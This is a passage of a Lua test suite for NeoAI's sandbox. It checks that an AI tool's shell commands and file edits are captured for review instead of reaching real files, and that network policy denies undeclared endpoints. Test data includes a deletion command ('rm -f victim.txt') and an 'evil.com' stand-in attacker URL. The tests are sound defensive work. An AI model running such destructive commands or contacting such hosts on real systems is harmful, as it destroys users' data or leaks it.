      t.eq(2, #pending[1].files, "合并条目应包含两次安装的全部文件")
      t.eq("apt-get", pending[1].package_manager, "应保留包管理器")
      -- 合并键不同的包安装不合并
      local it3 = review.enqueue(mk("sha256:pk3", "/var/lib/apt/lists/c"),
        { tool = "run_command", package = true, package_key = "apt-get:wget", package_manager = "apt-get" })
      t.not_nil(it3)
      t.eq(2, #sandbox.list_reviews({ review_state = "PENDING" }), "不同安装命令应各占一个条目")
    end)
  end)

  it("run_command：文件改动在 overlay 私有层冻结为候选", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end -- overlay 仅 bwrap 后端
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    fs.write_file(dir .. "/existing.txt", "hello\n")
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local done = false
      require("NeoAI.tools").execute("run_command", {
        command = "cat existing.txt > copy.txt; echo appended >> existing.txt", description = "t",
      }, {}):then_(function()
        t.false_(fs.exists(dir .. "/copy.txt"), "命令写入不应落到真实工作区")
        t.eq("hello", trim(fs.read_file(dir .. "/existing.txt")), "真实文件不应被命令修改")
        local items = sandbox.list_reviews({ review_state = "PENDING" })
        t.eq(1, #items, "命令的文件改动应冻结为一个候选")
        t.eq(2, #items[1].write_set, "应包含新建与修改两个文件")
        local res = sandbox.apply(items[1].change_set_id, { auto_approve = true })
        t.true_(res.ok, tostring(res.reason))
        t.true_(fs.exists(dir .. "/copy.txt"), "应用后新文件应存在")
        t.matches("appended", fs.read_file(dir .. "/existing.txt") or "", "应用后修改应生效")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(10000, function() return done end), "run_command 应完成")
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(dir, "rf")
  end)

  it("run_command：只读命令不重复捕获已暂存编辑（不取代/回滚）", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local candidate = require("NeoAI.sandbox.candidate")
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end -- overlay 仅 bwrap 后端
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    fs.write_file(dir .. "/a.txt", "base\n")
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    with_config({ tools = { approval = { mode = "auto_allow" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local function run(name, fn)
        local done = false
        fn(function() done = true end, function(e)
          t.true_(false, name .. " 失败: " .. tostring(e and e.message or e)); done = true
        end)
        t.true_(vim.wait(10000, function() return done end), name .. " 应完成")
      end
      run("edit_file", function(ok, err)
        require("NeoAI.tools").execute("edit_file",
          { filepath = dir .. "/a.txt", description = "t", mode = "write", content = "changed\n" }, {}):then_(ok, err)
      end)
      run("read-only run_command", function(ok, err)
        require("NeoAI.tools").execute("run_command",
          { command = "ls -la; cat a.txt >/dev/null", description = "t" }, {}):then_(ok, err)
      end)
      local items = sandbox.list_reviews({ review_state = "PENDING" })
      t.eq(1, #items, "只读命令不应额外产生候选")
      t.eq("edit_file", items[1].tool, "待审项应仍为 edit_file 候选（未被只读命令取代）")
      local staged = candidate.read_path(dir .. "/a.txt")
      t.not_nil(staged, "暂存副本应仍存在")
      t.matches("changed", fs.read_file(staged) or "", "暂存内容应保留编辑结果（未被回滚）")
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(dir, "rf")
  end)

  it("捕获：物化后未改动的暂存文件不产生候选（工作线程跳过、主线程不逐文件读）", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local candidate = require("NeoAI.sandbox.candidate")
    local control = require("NeoAI.sandbox.control")
    local store = require("NeoAI.sandbox.store")
    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() .. "/sb" } } }, function()
      sandbox.reset()
      local dir = fs.canonical(vim.fn.tempname())
      fs.ensure_dir(dir)
      local a = control.new_attempt("run_command", {}, {}, { effect = "process" })
      candidate.begin(a, store.root())
      -- 用 merge_candidate 填充工作区暂存（run_command 的 process 工具不预填 attempt.mapping，
      -- 只能由 capture 从 overlay 捕获，与 stage_path 的 fs_write 路径不同）。
      local N, files = 30, {}
      for i = 1, N do
        local p = dir .. "/f" .. i .. ".txt"
        fs.write_file(p, "base " .. i .. "\n")
        files[#files + 1] = {
          path = p, action = "modify", content = "staged " .. i .. "\n",
          before_hash = "sha256:base" .. i, after_hash = "sha256:staged" .. i, mode = 420,
        }
      end
      candidate.merge_candidate({ files = files })
      -- 模拟 run_command 的会话 overlay：物化暂存内容进 upper，命令未改动任何文件。
      local base = vim.fn.tempname()
      local upper, work = base .. "/upper", base .. "/work"
      fs.ensure_dir(upper); fs.ensure_dir(work)
      local specs = { { root = dir, upper = upper, work = work, mode = "overlay" } }
      candidate.materialize_overlay(specs)
      local done = false
      candidate.capture_overlay_async(a.attempt_id, dir, upper):then_(function()
        return candidate.finish_async(a.attempt_id)
      end):then_(function(cand)
        t.eq(0, #((cand and cand.files) or {}), "未改动的暂存文件不应产生候选")
        -- 命令只改动一个文件：仅该文件应被捕获。
        fs.write_file(upper .. "/f1.txt", "changed by command\n")
        return candidate.capture_overlay_async(a.attempt_id, dir, upper):then_(function()
          return candidate.finish_async(a.attempt_id)
        end)
      end):then_(function(cand)
        t.eq(1, #((cand and cand.files) or {}), "仅命令改动的文件产生候选")
        t.eq(dir .. "/f1.txt", cand.files[1].path, "候选路径应为被改动文件")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and (e.message or e) or e)); done = true
      end)
      t.true_(vim.wait(10000, function() return done end), "捕获应完成")
      candidate.cleanup(a.attempt_id)
    end)
    vim.fn.delete(dir, "rf")
  end)

  it("冻结分块并行：多块结果与单块一致（多核）", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local candidate = require("NeoAI.sandbox.candidate")
    local control = require("NeoAI.sandbox.control")
    local store = require("NeoAI.sandbox.store")
    local config_store = require("NeoAI.kernel.config_store")
    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() .. "/sb" } } }, function()
      sandbox.reset()
      local dir = fs.canonical(vim.fn.tempname())
      fs.ensure_dir(dir)
      local function build()
        local a = control.new_attempt("edit_file", {}, {}, { effect = "fs_write" })
        candidate.begin(a, store.root())
        for i = 1, 12 do
          local staged = candidate.stage_path(a.attempt_id, dir .. "/g" .. i .. ".txt")
          fs.write_file(staged, "content " .. i .. "\n")
        end
        return a
      end
      config_store.set("tools.sandbox.work_chunk_files", 1024)
      local a1 = build()
      local c1 = t.await(candidate.finish_async(a1.attempt_id))
      candidate.cleanup(a1.attempt_id)
      config_store.set("tools.sandbox.work_chunk_files", 2)
      local a2 = build()
      local c2 = t.await(candidate.finish_async(a2.attempt_id))
      candidate.cleanup(a2.attempt_id)
      t.eq(12, #c1.files, "单块应冻结 12 个文件")
      t.eq(#c1.files, #c2.files, "分块与单块文件数应一致")
      t.eq(c1.candidate_digest, c2.candidate_digest, "分块与单块候选摘要应一致")
    end)
    vim.fn.delete(dir, "rf")
  end)

  it("物化：未改动的暂存文件重复物化跳过写入（不重读/重写）", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local candidate = require("NeoAI.sandbox.candidate")
    local control = require("NeoAI.sandbox.control")
    local store = require("NeoAI.sandbox.store")
    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() .. "/sb" } } }, function()
      sandbox.reset()
      local dir = fs.canonical(vim.fn.tempname())
      fs.ensure_dir(dir)
      local a = control.new_attempt("run_command", {}, {}, { effect = "process" })
      candidate.begin(a, store.root())
      local files = {}
      for i = 1, 20 do
        local p = dir .. "/f" .. i .. ".txt"
        fs.write_file(p, "base " .. i .. "\n")
        files[#files + 1] = {
          path = p, action = "modify", content = "staged " .. i .. "\n",
          before_hash = "sha256:base" .. i, after_hash = "sha256:staged" .. i, mode = 420,
        }
      end
      candidate.merge_candidate({ files = files })
      local base = vim.fn.tempname()
      local upper, work = base .. "/upper", base .. "/work"
      fs.ensure_dir(upper); fs.ensure_dir(work)
      local specs = { { root = dir, upper = upper, work = work, mode = "overlay" } }
      candidate.materialize_overlay(specs)
      local orig = fs.write_file_atomic
      local calls = 0
      fs.write_file_atomic = function(...) calls = calls + 1; return orig(...) end
      candidate.materialize_overlay(specs)
      fs.write_file_atomic = orig
      t.eq(0, calls, "未改动文件重复物化不应重写")
      -- 改动一个暂存文件后应只重写该文件
      local staged = candidate.read_path(dir .. "/f1.txt")
      fs.write_file(staged, "staged 1 v2\n")
      local orig2 = fs.write_file_atomic
      local calls2 = 0
      fs.write_file_atomic = function(...) calls2 = calls2 + 1; return orig2(...) end
      candidate.materialize_overlay(specs)
      fs.write_file_atomic = orig2
      t.eq(1, calls2, "仅改动的暂存文件应重写")
      candidate.cleanup(a.attempt_id)
    end)
    vim.fn.delete(dir, "rf")
  end)

  it("run_command：删除冻结为 delete 候选且不删真实文件", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end -- overlay 仅 bwrap 后端
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    fs.write_file(dir .. "/victim.txt", "KEEP\n")
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local done = false
      require("NeoAI.tools").execute("run_command", {
        command = "rm -f victim.txt", description = "t",
      }, {}):then_(function()
        t.true_(fs.exists(dir .. "/victim.txt"), "dry_run 下真实文件不应被删除")
        local items = sandbox.list_reviews({ review_state = "PENDING" })
        t.eq(1, #items, "删除应冻结为一个待审变更单元")
        local found
        for _, f in ipairs(items[1].files or {}) do
          if f.path == dir .. "/victim.txt" then found = f end
        end
        t.not_nil(found, "候选应包含被删除路径（whiteout 捕获）")
        t.eq("delete", found.action)
        local res = sandbox.apply(items[1].change_set_id, { auto_approve = true })
        t.true_(res.ok, tostring(res.reason))
        t.false_(fs.exists(dir .. "/victim.txt"), "应用后真实文件应被删除")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(10000, function() return done end), "run_command 应完成")
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(dir, "rf")
  end)

  it("run_command：尝试目录被清理且无残留（overlay work 可移除）", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local root = vim.fn.tempname() .. "/sandbox"
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", workspace_root = root, review = { enabled = true } } } }, function()
      sandbox.reset()
      local done = false
      require("NeoAI.tools").execute("run_command", {
        command = "echo hi", description = "t",
      }, {}):then_(function()
        local leftover = {}
        local handle = vim.uv.fs_scandir(root .. "/attempts")
        if handle then
          while true do
            local name = vim.uv.fs_scandir_next(handle)
            if not name then break end
            leftover[#leftover + 1] = name
          end
        end
        t.eq(0, #leftover, "尝试目录应被清理: " .. table.concat(leftover, ","))
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(10000, function() return done end), "run_command 应完成")
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(dir, "rf")
    vim.fn.delete(root, "rf")
  end)

  it("writer：发布保留候选权限位（不强制 0600）", function(t)
    local fs = require("NeoAI.utils.fs")
    local writer = require("NeoAI.sandbox.writer")
    local p = vim.fn.tempname() .. "-mode.sh"
    local res = writer.apply("write", p, "#!/bin/sh\necho hi\n", { mode = 493 }) -- 0755
    t.true_(res.ok, tostring(res.err))
    local st = vim.uv.fs_stat(p)
    t.not_nil(st, "文件应存在")
    t.eq(493, (st.mode % 512), "应保留 0755（实际 " .. tostring(st and st.mode) .. "）")
    fs.delete_file(p)
    -- 未记录权限的新建文件应为常规 0644，而非 mkstemp 的 0600
    local p2 = vim.fn.tempname() .. "-new.txt"
    local res2 = writer.apply("write", p2, "x\n", {})
    t.true_(res2.ok, tostring(res2.err))
    t.eq(420, (vim.uv.fs_stat(p2).mode % 512), "新建文件应为 0644")
    fs.delete_file(p2)
  end)

  it("run_command：命令创建的文件保留可执行位（物化/发布）", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local tools = require("NeoAI.tools")
      local done = false
      tools.execute("run_command", {
        command = "printf '#!/bin/sh\\necho hi\\n' > mk.sh && chmod +x mk.sh", description = "t",
      }, {}):then_(function()
        -- 第二条命令应看到可执行位（materialize 按候选权限恢复）
        return tools.execute("run_command", { command = "test -x mk.sh && echo EXEC || echo NOEXEC", description = "t" }, {})
      end):then_(function(r)
        t.matches("EXEC", tostring(r), "沙箱内命令创建的可执行脚本应保持 +x")
        for _, item in ipairs(sandbox.list_reviews({ review_state = "PENDING" })) do
          local covers = false
          for _, f in ipairs(item.files or {}) do if f.path == dir .. "/mk.sh" then covers = true end end
          if covers then
            local res = sandbox.apply(item.change_set_id, { auto_approve = true })
            t.true_(res.ok, tostring(res.reason))
          end
        end
        local st = vim.uv.fs_stat(dir .. "/mk.sh")
        t.not_nil(st, "发布后真实文件应存在")
        local perm = st and (st.mode % 512) or 0
        t.true_(math.floor(perm / 64) % 2 == 1, "发布后应保留可执行位（实际 perm=" .. tostring(perm) .. "）")
        done = true
      end, function(e) t.true_(false, "不应失败: " .. tostring(e and e.message or e)); done = true end)
      t.true_(vim.wait(20000, function() return done end), "run_command 应完成")
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(dir, "rf")
  end)

  it("run_command：命令删除沙箱-only 文件后不被旧候选复活", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local tools = require("NeoAI.tools")
      local done = false
      tools.execute("run_command", { command = "echo OLD > out.txt", description = "t" }, {})
        :then_(function()
          return tools.execute("run_command", { command = "rm -f out.txt; ls out.txt 2>&1 || echo GONE", description = "t" }, {})
        end):then_(function(r)
          t.matches("GONE", tostring(r), "删除后命令视图应看不到 out.txt")
          return tools.execute("run_command", { command = "test -e out.txt && echo RESURRECTED || echo ABSENT", description = "t" }, {})
        end):then_(function(r2)
          t.matches("ABSENT", tostring(r2), "被删除的沙箱-only 文件不应被旧候选复活")
          done = true
        end, function(e) t.true_(false, "不应失败: " .. tostring(e and e.message or e)); done = true end)
      t.true_(vim.wait(20000, function() return done end), "run_command 应完成")
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(dir, "rf")
  end)

  it("影响模型：fs/process 记录与统计（未知用 null）", function(t)
    local impact = require("NeoAI.sandbox.impact")
    local cand = { files = {
      { action = "create", path = "/a", after_hash = "h1" },
      { action = "modify", path = "/b", before_hash = "h0", after_hash = "h2" },
      { action = "delete", path = "/c", before_hash = "h3" },
    } }
    local fs_impacts = impact.from_candidate(cand, { command_id = "cmd" })
    t.eq(3, #fs_impacts)
    local stats = impact.stats(fs_impacts)
    t.eq(1, stats.fs.observed_creates)
    t.eq(1, stats.fs.observed_writes)
    t.eq(1, stats.fs.observed_deletes)
    t.eq(nil, stats.network.observed_tx_bytes, "未知字节数应为 null 而非 0")
    local proc = impact.process({ command = "ls", code = 0 })
    t.eq("process", proc.type)
    t.eq(0, proc.exit_code)
  end)

  it("证据：秘密字段脱敏且可分页读取", function(t)
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() } } }, function()
      sandbox.reset()
      local evidence = require("NeoAI.sandbox.evidence")
      local id = evidence.add("test", { token = "secret", nested = { password = "x", ok = 1 } }, { tool = "t" })
      local rec = evidence.get(id)
      t.eq("[redacted]", rec.payload.token, "token 应脱敏")
      t.eq("[redacted]", rec.payload.nested.password, "嵌套 password 应脱敏")
      t.eq(1, rec.payload.nested.ok)
      evidence.add("test", { a = 1 }, {})
      evidence.add("test", { a = 2 }, {})
      local page1 = evidence.page({ limit = 2 })
      t.eq(2, #page1.items)
      t.not_nil(page1.next_cursor, "应有下一页游标")
      local page2 = evidence.page({ limit = 2, after_id = page1.next_cursor })
      t.true_(#page2.items >= 1)
    end)
  end)

  it("任务授权：覆盖候选时自动应用并消费预算", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      sandbox.create_grant({ scope = { paths = { dir } }, operations = { "fs_write" }, budget = { max_files = 5 } })
      local p = dir .. "/f.txt"
      fs.write_file(p, "v1\n")
      local done = false
      require("NeoAI.tools").execute("edit_file", { filepath = p, mode = "write", content = "v2\n", description = "t" }, {})
        :then_(function()
          t.eq("v2", trim(fs.read_file(p)), "有覆盖授权时应自动应用")
          t.eq(0, #sandbox.list_reviews({ review_state = "PENDING" }), "不应进入待审队列")
          local g = sandbox.list_grants({ active_only = true })[1]
          t.eq(1, g.usage.files, "应消费预算")
          done = true
        end, function(e) t.true_(false, tostring(e and e.message or e)); done = true end)
      t.true_(vim.wait(3000, function() return done end), "edit_file 应完成")
    end)
    vim.fn.delete(dir, "rf")
  end)

  it("任务授权：范围外不覆盖 → 进入待审", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      sandbox.create_grant({ scope = { paths = { "/some/other/place" } }, operations = { "fs_write" } })
      local p = dir .. "/f.txt"
      fs.write_file(p, "v1\n")
      local done = false
      require("NeoAI.tools").execute("edit_file", { filepath = p, mode = "write", content = "v2\n", description = "t" }, {})
        :then_(function()
          t.eq("v1", trim(fs.read_file(p)), "范围外不应自动应用")
          t.eq(1, #sandbox.list_reviews({ review_state = "PENDING" }), "应进入待审")
          done = true
        end, function(e) t.true_(false, tostring(e and e.message or e)); done = true end)
      t.true_(vim.wait(3000, function() return done end), "edit_file 应完成")
    end)
    vim.fn.delete(dir, "rf")
  end)

  it("策略约束聚合：预算取更小值", function(t)
    local policy = require("NeoAI.sandbox.policy")
    with_config({ tools = { sandbox = { policy = { rules = {
      function() return { decision = "ALLOW", constraints = { max_files = 5 } } end,
      function() return { decision = "ALLOW", constraints = { max_files = 3 } } end,
    } } } } }, function()
      local v = policy.evaluate({ tool = "x", effect = "read" })
      t.eq("ALLOW", v.decision)
      t.eq(3, v.constraints.max_files, "预算应取更小值（更严格）")
    end)
  end)

  it("裁决信封：枚举校验与截断", function(t)
    local envelope = require("NeoAI.sandbox.envelope")
    local asks = {}
    for i = 1, 7 do asks[i] = { id = "ask_" .. i } end
    local env = envelope.build({
      command_id = "cmd", state = "AWAITING_PUBLICATION_AUTH",
      decision = "BOGUS", severity = "NOPE",
      candidate_digest = "sha256:x", asks = asks,
      evidence = { "e1", "e2" }, stats = { fs = { observed_creates = 1 } },
    })
    t.eq("NEEDS_CONFIRMATION", env.decision, "非法 decision 应回退")
    t.eq("LOW", env.severity, "非法 severity 应回退")
    t.eq(5, #env.asks, "asks 应截断到 5 条")
    t.eq(7, env.asks_total)
    t.true_(env.truncated)
    t.matches("decision=", envelope.to_text(env))
  end)

  it("保留期清理与指标", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", retention = { candidate_days = -1 }, review = { enabled = true } } } }, function()
      sandbox.reset()
      local p = vim.fn.tempname() .. ".txt"
      fs.write_file(p, "v1\n")
      local done = false
      require("NeoAI.tools").execute("edit_file", { filepath = p, mode = "write", content = "v2\n", description = "t" }, {})
        :then_(function()
          local item = sandbox.list_reviews({ review_state = "PENDING" })[1]
          sandbox.reject(item.change_set_id)
          local m = sandbox.metrics()
          t.eq(1, m.rejected)
          local res = sandbox.prune()
          t.true_(res.removed_reviews >= 1, "应清理过期已拒绝变更单元")
          fs.delete_file(p)
          done = true
        end, function(e) t.true_(false, tostring(e and e.message or e)); done = true end)
      t.true_(vim.wait(3000, function() return done end), "edit_file 应完成")
    end)
  end)

  it("受控网络网关：默认拒绝，声明端点后按应用层校验", function(t)
    local policy = require("NeoAI.sandbox.policy")
    local network = require("NeoAI.sandbox.network")
    -- 默认放行（仅记录）：不拦截
    with_config({ tools = { sandbox = {} } }, function()
      local v = policy.evaluate({ tool = "web_fetch", effect = "network", args = { url = "https://api.example.com/x" } })
      t.eq("ALLOW", v.decision)
    end)
    -- 显式离线：拒绝
    with_config({ tools = { sandbox = { offline = true } } }, function()
      local v = policy.evaluate({ tool = "web_fetch", effect = "network", args = { url = "https://api.example.com/x" } })
      t.eq("DENY", v.decision)
      t.true_(vim.tbl_contains(v.reason_codes, "NETWORK_OFFLINE"))
    end)
    -- 受控联网：仅声明端点放行
    with_config({ tools = { sandbox = { offline = false, network = { enabled = true, allowed_endpoints = { "*.example.com" } } } } }, function()
      network.reset()
      t.true_(network.authorize("https://api.example.com/x"))
      t.false_(network.authorize("https://evil.com/x"))
      local v = policy.evaluate({ tool = "web_fetch", effect = "network", args = { url = "https://evil.com/x" } })
      t.eq("DENY", v.decision)
      t.true_(vim.tbl_contains(v.reason_codes, "ENDPOINT_NOT_ALLOWED: https://evil.com/x"))
    end)
  end)

  it("网络：默认放行并记录证据（不拦截）", function(t)
    local sandbox = require("NeoAI.sandbox")
    local evidence = require("NeoAI.sandbox.evidence")
    local async = require("NeoAI.utils.async")
    with_config({ tools = { sandbox = { enabled = true, mode = "dry_run" } } }, function()
      sandbox.reset()
      local tool = { name = "web_fetch", __sandboxed = true, __sandbox_spec = { effect = "network", paths = {} } }
      local called = false
      local d = sandbox.gate(tool, { url = "https://example.com/x" }, {}, function()
        called = true
        return async.resolve("ok")
      end)
      local done, value = false, nil
      d:then_(function(v) value = v; done = true end, function(e) value = e; done = true end)
      t.true_(vim.wait(2000, function() return done end), "网络工具应完成")
      t.eq("ok", value, "网络工具应被执行（不拦截）")
      t.true_(called, "原工具应被调用")
      local page = evidence.page({ kind = "network" })
      t.true_(#page.items >= 1, "应记录网络证据")
      t.eq("https://example.com/x", page.items[1].payload and page.items[1].payload.endpoint)
    end)
  end)

  it("broker：能力声明、幂等与对账", function(t)
    local broker = require("NeoAI.sandbox.broker")
    broker.reset()
    local calls = 0
    broker.register({
      id = "test_adapter",
      supports_idempotency = true,
      supports_query = true,
      transaction_boundary = true,
      irreversible_effects = false,
      invoke = function(op, params) calls = calls + 1; return { op = op, value = params.value } end,
      query = function() return true end,
    })
    local listed = broker.list()
    t.eq(1, #listed)
    t.true_(listed[1].capabilities.supports_idempotency)
    t.false_(listed[1].capabilities.irreversible_effects)

    local r1 = broker.invoke("test_adapter", "write", { value = 1 }, { idempotency_key = "k1" })
    t.true_(r1.ok)
    t.eq(1, calls)
    local r2 = broker.invoke("test_adapter", "write", { value = 1 }, { idempotency_key = "k1" })
    t.true_(r2.ok, "同键同请求应复用结果")
    t.eq(1, calls, "不应重复调用远端")
    local r3 = broker.invoke("test_adapter", "write", { value = 2 }, { idempotency_key = "k1" })
    t.false_(r3.ok, "同键不同请求应拒绝")
    t.matches("IDEMPOTENCY", r3.reason)

    local rec = broker.reconcile(r1.operation_id)
    t.true_(rec.ok)
    t.eq("SUCCEEDED", rec.state)

    -- 不可查询的适配器：结果不明进入 OUTCOME_UNKNOWN
    broker.register({ id = "no_query", invoke = function() return { outcome_unknown = true } end })
    local ru = broker.invoke("no_query", "do", {}, {})
    t.false_(ru.ok)
    t.eq("OUTCOME_UNKNOWN", ru.state)
  end)

  it("依赖图：闭包拓扑序与缺失依赖阻塞", function(t)
    local sandbox = require("NeoAI.sandbox")
    local review = require("NeoAI.sandbox.review")
    local store = require("NeoAI.sandbox.store")
    with_config({ tools = { sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local function cand(digest, path, content)
        return { candidate_digest = digest, effect = "fs_write", created_at = os.time(),
          files = { { path = path, action = "create", after_hash = "h" .. digest, content = content, base_exists = false } } }
      end
      local cA = cand("sha256:A", "/tmp/dep_a", "A")
      local cB = cand("sha256:B", "/tmp/dep_b", "B")
      store.write_candidate(cA); store.write_candidate(cB)
      review.enqueue(cA, { id = "csA" })
      review.enqueue(cB, { id = "csB", depends_on = { "csA" } })
      local deps = review.dependencies("csB")
      t.deep_eq({ "csA", "csB" }, deps.order, "依赖应排在被依赖者之后")
      t.eq(0, #deps.missing)
      -- 缺失依赖 → BLOCKED_DEPENDENCY
      store.write_candidate(cand("sha256:C", "/tmp/dep_c", "C"))
      review.enqueue(cand("sha256:C", "/tmp/dep_c", "C"), { id = "csC", depends_on = { "nope" } })
      local d3 = review.dependencies("csC")
      t.true_(#d3.missing >= 1)
      local set = review.prepare_publication_set({ "csC" })
      t.eq("BLOCKED_DEPENDENCY", set.state)
    end)
  end)

  it("组合发布集合：合并多候选并 CAS 应用", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local dir = vim.fn.tempname()
      fs.ensure_dir(dir)
      local p1, p2 = dir .. "/a.txt", dir .. "/b.txt"
      fs.write_file(p1, "a1\n"); fs.write_file(p2, "b1\n")
      local tools = require("NeoAI.tools")
      local pending = 0
      local ids = {}
      local function run(p, content, cb)
        tools.execute("edit_file", { filepath = p, mode = "write", content = content, description = "t" }, {})
          :then_(function() cb() end, function(e) t.true_(false, tostring(e and e.message or e)); cb() end)
      end
      local done = false
      run(p1, "a2\n", function()
        run(p2, "b2\n", function()
          for _, it in ipairs(sandbox.list_reviews({ review_state = "PENDING" })) do
            pending = pending + 1; ids[#ids + 1] = it.change_set_id
          end
          t.eq(2, pending, "应有两个待审变更单元")
          local set = sandbox.prepare_publication_set(ids)
          t.eq("READY", set.state)
          t.eq(2, #set.candidate.files, "组合候选应含两个文件")
          t.not_nil(set.publication_intent_hash)
          local res = sandbox.apply_set(set)
          t.true_(res.ok, tostring(res.reason))
          t.eq("a2", trim(fs.read_file(p1)))
          t.eq("b2", trim(fs.read_file(p2)))
          done = true
        end)
      end)
      t.true_(vim.wait(5000, function() return done end), "组合发布应完成")
      vim.fn.delete(dir, "rf")
    end)
  end)

  it("组合发布集合：同路径冲突拒绝", function(t)
    local sandbox = require("NeoAI.sandbox")
    local review = require("NeoAI.sandbox.review")
    local store = require("NeoAI.sandbox.store")
    with_config({ tools = { sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local function cand(digest, content)
        return { candidate_digest = digest, effect = "fs_write", created_at = os.time(),
          files = { { path = "/tmp/conflict_same", action = "modify", after_hash = "h" .. digest, content = content, before_hash = "base" } } }
      end
      local c1, c2 = cand("sha256:X", "X"), cand("sha256:Y", "Y")
      store.write_candidate(c1); store.write_candidate(c2)
      review.enqueue(c1, { id = "cx1" })
      review.enqueue(c2, { id = "cx2" })
      local set = review.prepare_publication_set({ "cx1", "cx2" })
      t.eq("CONFLICT", set.state)
      t.true_(#set.conflicts >= 1)
      t.eq("PATH_CONFLICT", set.conflicts[1].reason)
    end)
  end)

  it("策略回放：同事实同规则裁决可复现", function(t)
    local sandbox = require("NeoAI.sandbox")
    local policy = require("NeoAI.sandbox.policy")
    with_config({ tools = { sandbox = { policy = { version = "1", deny_tools = { "run_command" } } } } }, function()
      sandbox.reset()
      local facts = { tool = "run_command", effect = "process" }
      local verdict = policy.evaluate(facts)
      t.eq("DENY", verdict.decision)
      local eid = sandbox.record_decision(facts, verdict, {})
      local res = sandbox.replay(eid)
      t.true_(res.ok)
      t.true_(res.same, "回放应产生相同裁决")
      t.eq("DENY", res.actual.decision)
      t.false_(res.version_mismatch)
    end)
  end)

  it("证据保留期清理：默认保留裁决记录", function(t)
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() } } }, function()
      sandbox.reset()
      local evidence = require("NeoAI.sandbox.evidence")
      local obs = evidence.add("observation", { x = 1 }, {})
      local dec = evidence.add("decision", { facts = {}, verdict = { decision = "ALLOW" } }, {})
      local removed = evidence.prune(-1)
      t.true_(removed >= 1, "应清理过期观测证据")
      t.eq(nil, evidence.get(obs))
